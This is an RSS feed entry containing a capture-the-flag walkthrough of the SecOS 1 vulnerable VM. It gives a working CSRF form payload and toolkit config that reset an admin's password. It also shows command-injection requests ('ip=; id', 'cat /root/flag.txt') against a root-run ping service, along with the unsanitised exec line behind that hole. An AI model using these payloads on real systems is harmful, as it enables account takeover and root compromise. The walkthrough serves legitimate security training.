<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Secos on Cheesy Rumbles</title>
    <link>http://rastamouse.me/categories/secos/</link>
    <description>Recent content in Secos on Cheesy Rumbles</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 25 May 2014 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://rastamouse.me/categories/secos/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SecOS 1</title>
      <link>http://rastamouse.me/writeups/2014/secos-1/</link>
      <pubDate>Sun, 25 May 2014 00:00:00 +0000</pubDate>
      
      <guid>http://rastamouse.me/writeups/2014/secos-1/</guid>
      <description>

&lt;p&gt;SecOS is a series of vulnerable VMs created by &lt;a href=&#34;https://twitter.com/PaulWebSec&#34;&gt;PaulSec&lt;/a&gt; - launched as part of his talk at BSides London 2014 (which I attended) and focus around CSRF vulnerabilities.  Paul is also the author of the &lt;a href=&#34;https://github.com/PaulSec/CSRFT&#34;&gt;CSRF Toolkit&lt;/a&gt;, which can be used to attack the SecOS VMs.&lt;/p&gt;

&lt;h2 id=&#34;nmap:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;Nmap&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -p- -A 192.168.127.133

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
|_  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
8081/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Web App
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=6.45%I=7%D=5/25%Time=53824B3F%P=i686-pc-linux-gnu%r(NULL,2
SF:7,&amp;quot;SSH-2\.0-OpenSSH_6\.6p1\x20Ubuntu-2ubuntu1\r\n&amp;quot;);
MAC Address: 08:00:27:74:13:C8 (Cadmus Computer Systems)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;secure-web-app:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;Secure Web App&lt;/h2&gt;




    
    
        
        
        
        
    

    
    
    

    
    




    


    

    
        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
            &lt;img src=&#34;http://rastamouse.me/img/writeups/secos-1/webapp.jpg&#34; alt=&#34;&#34; /&gt;
        &lt;/span&gt;&lt;/p&gt;
    



&lt;p&gt;This is a custom web app written by Paul for the challenge.  I created a new user with username: &lt;code&gt;rasta&lt;/code&gt;, password: &lt;code&gt;mouse&lt;/code&gt; and then logged in.  I was then able to get a list of users on the system.&lt;/p&gt;




    
    
        
        
        
        
    

    
    
    

    
    




    


    

    
        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
            &lt;img src=&#34;http://rastamouse.me/img/writeups/secos-1/users.jpg&#34; alt=&#34;&#34; /&gt;
        &lt;/span&gt;&lt;/p&gt;
    



&lt;p&gt;It seems &lt;code&gt;spiderman&lt;/code&gt; was the only admin account, and would probably be a good target to go for (also remembering Paul&amp;rsquo;s use of a spiderman account during his BSides talk :) ).&lt;/p&gt;

&lt;p&gt;Since this is a CSRF type challenge, it was reasonable to assume that there is possibly some weakness in how users/passwords are created or changed.  I had a look through the source code of some of the pages and noticed this commented line on the sign up page:&lt;/p&gt;




    
    
        
        
        
        
    

    
    
    

    
    




    


    

    
        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
            &lt;img src=&#34;http://rastamouse.me/img/writeups/secos-1/hint1.jpg&#34; alt=&#34;&#34; /&gt;
        &lt;/span&gt;&lt;/p&gt;
    



&lt;p&gt;Navigating to this page, and reviewing that source code reveals these comments:&lt;/p&gt;




    
    
        
        
        
        
    

    
    
    

    
    




    


    

    
        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
            &lt;img src=&#34;http://rastamouse.me/img/writeups/secos-1/hint2.jpg&#34; alt=&#34;&#34; /&gt;
        &lt;/span&gt;&lt;/p&gt;
    



&lt;p&gt;So we can surmise that &lt;code&gt;spiderman&lt;/code&gt; is logged into the web app and is set to automatically request a page on &lt;code&gt;localhost&lt;/code&gt;.  The third hint looks confusing, and took me a while to figure.&lt;/p&gt;

&lt;p&gt;The web app allows users to send messages to each other.  I used my &lt;code&gt;rasta&lt;/code&gt; account to send a message to &lt;code&gt;spiderman&lt;/code&gt;, containing a URL which he will visit.  I will need to craft a special web request which will be &amp;lsquo;unknowingly&amp;rsquo; executed by &lt;code&gt;spiderman&lt;/code&gt; - this can be done manually but I chose to use Pauls CSRF toolkit.&lt;/p&gt;

&lt;h2 id=&#34;csrft:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;CSRFT&lt;/h2&gt;

&lt;p&gt;The toolkit can be downloaded from GitHub, instructions for installation etc. are included.  A number of example exploits and configurations are included, which I used as a template to craft mine (included at the end of this article).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/CSRFT# node server.js conf/secos1_change_password.json
CSRFT: Toolkit for CSRF vulnerabilities.
Using conf/secos1_change_password.json as configuration file
Listening on port 8080
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Send the message&amp;hellip;&lt;/p&gt;




    
    
        
        
        
        
    

    
    
    

    
    




    


    

    
        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
            &lt;img src=&#34;http://rastamouse.me/img/writeups/secos-1/message.jpg&#34; alt=&#34;&#34; /&gt;
        &lt;/span&gt;&lt;/p&gt;
    



&lt;p&gt;After a minute or so, I got a connection from the VM IP address and the &amp;lsquo;exploit&amp;rsquo; was launched.  Going back to the web app, I was now able to log in with username: &lt;code&gt;spiderman&lt;/code&gt;, password: &lt;code&gt;spiderman&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;ssh:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;SSH&lt;/h2&gt;

&lt;p&gt;There isn&amp;rsquo;t anything much to see whilst logged in as &lt;code&gt;spiderman&lt;/code&gt;, though on the Messages page I saw that the user called &lt;code&gt;pirate&lt;/code&gt; was one-step ahead.&lt;/p&gt;




    
    
        
        
        
        
    

    
    
    

    
    




    


    

    
        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
            &lt;img src=&#34;http://rastamouse.me/img/writeups/secos-1/password.jpg&#34; alt=&#34;&#34; /&gt;
        &lt;/span&gt;&lt;/p&gt;
    



&lt;p&gt;I was able to use this password to SSH as &lt;code&gt;spiderman&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After some enumeration I found that &lt;code&gt;spiderman&lt;/code&gt; was not a member of the sudoers group, and the kernel was quite new (therefore unlikely to find a local kernel exploit).&lt;/p&gt;

&lt;h2 id=&#34;privilege-escalation:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;I had a look at processes running as root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;spiderman@SecOS-1:~$ ps aux | grep root
root       941  0.0  0.2   4692  1020 ?        Ss   21:25   0:00 sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Reviewing this file reveals that a secondary web app is running, bound to port &lt;code&gt;9000&lt;/code&gt; to &lt;code&gt;127.0.0.1&lt;/code&gt;.  I confirmed this with &lt;code&gt;netstat&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;spiderman@SecOS-1:~$ netstat -antp
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Reviewing this file further shows that this is an application to simple ping a supplied IP address.  However, the application is vulnerable to command injection as user input doesn&amp;rsquo;t appear to be sanitized.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;child = exec(&#39;ping &#39; + ip, function (error, stdout, stderr)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This makes it possible to insert commands to be executed by the exec function, as part of the IP input.  I did this directly using &lt;code&gt;cURL&lt;/code&gt; (although you could setup a reverse SSH connection, and interact via a web browser).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;spiderman@SecOS-1:~$ curl --data &amp;quot;ip=; id&amp;quot; localhost:9000
uid=0(root) gid=0(root) groups=0(root)

spiderman@SecOS-1:~$ curl --data &amp;quot;ip=; ls -l /root&amp;quot; localhost:9000
-rw-r--r-- 1 root root 346 May  5 20:53 flag.txt

spiderman@SecOS-1:~$ curl --data &amp;quot;ip=; cat /root/flag.txt&amp;quot; localhost:9000

Hey,
Congrats, you did it ! 
The flag for this first (VM) is: MickeyMustNotDie.
Keep this flag because it will be needed for the next VM.
If you liked the Web application, the code is available on Github. 
(https://github.com/PaulSec/VNWA)
There should be more VMs to come in the next few weeks/months.
Twitter: @PaulWebSec
GitHub : PaulSec
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;notes:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;Notes&lt;/h2&gt;

&lt;h3 id=&#34;exploits-secos1-change-password-html:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;exploits/secos1-change-password.html&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;form class=&amp;quot;form-signin&amp;quot; action=&amp;quot;http://127.0.0.1:8081/change-password&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
        &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;username&amp;quot; value=&amp;quot;spiderman&amp;quot;&amp;gt;
        &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot; value=&amp;quot;spiderman&amp;quot;&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;conf-secos1-change-password-json:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;conf/secos1_change_password.json&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
        &amp;quot;audit&amp;quot;: {
                &amp;quot;name&amp;quot;: &amp;quot;SecOS 1 Change Password&amp;quot;,
                &amp;quot;scenario&amp;quot;: [
                        {
                                &amp;quot;attack&amp;quot;: [
                                        {
                                                &amp;quot;method&amp;quot;: &amp;quot;POST&amp;quot;,
                                                &amp;quot;type_attack&amp;quot;: &amp;quot;special_value&amp;quot;,
                                                &amp;quot;form&amp;quot;: &amp;quot;secos1-change-password.html&amp;quot;
                                        }
                                ]
                        }
                ]
        }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;update-26-05-2014:a8f3f5408c20b5fb1272625cc4f385d6&#34;&gt;Update 26/05/2014&lt;/h2&gt;

&lt;p&gt;After having a rather informative discussion with Paul regarding this solution, he suggested I also try &lt;code&gt;csrft_utils.py&lt;/code&gt;.  This is a script designed to automate much of the attack process (i.e. grabbing the form and creating the attack config files on the fly) and is included in the CSRF toolkit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/CSRFT/utils# python csrft_utils.py --form=http://192.168.127.133:8081/change-password --param=password password=spiderman --param=username username=spiderman --special_value --cookie=&amp;quot;connect.sid=sALvvNoiErYoIP6a8Cc4Ewsxir.pfPhlR8SWKt7RqyK85Yli9EHPq1IC96jpZd1hRv%2FVx0&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Most of this command is self-explanatory, though I shall sum it up.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;form is the URL to the vulnerable form&lt;/li&gt;
&lt;li&gt;param is where we define the parameters to inject into the form, in this case I specified the username and desired password for spiderman.&lt;/li&gt;
&lt;li&gt;special_value defines the method of attack&lt;/li&gt;
&lt;li&gt;cookie is a valid cookie of a logged in user.  In my case I used the cookie assigned to my rasta account whilst I was logged in.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Executing this command will drop the form and conf files into &lt;code&gt;/tmp/csrft/&lt;/code&gt;.  They look very much like to my manual examples above.&lt;/p&gt;

&lt;p&gt;Due to the nature of how the admin access is simulated in this challange, you have to edit &lt;code&gt;/tmp/csrft/form.html&lt;/code&gt;, so that the form action points to &lt;code&gt;127.0.0.1&lt;/code&gt; rather than the actual IP assigned to the VM (as per the advice given on the &lt;code&gt;/hint&lt;/code&gt; page).&lt;/p&gt;

&lt;p&gt;As previously, the &lt;code&gt;admin&lt;/code&gt; user will access port &lt;code&gt;8080&lt;/code&gt; on our machine and submit the bogus form.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>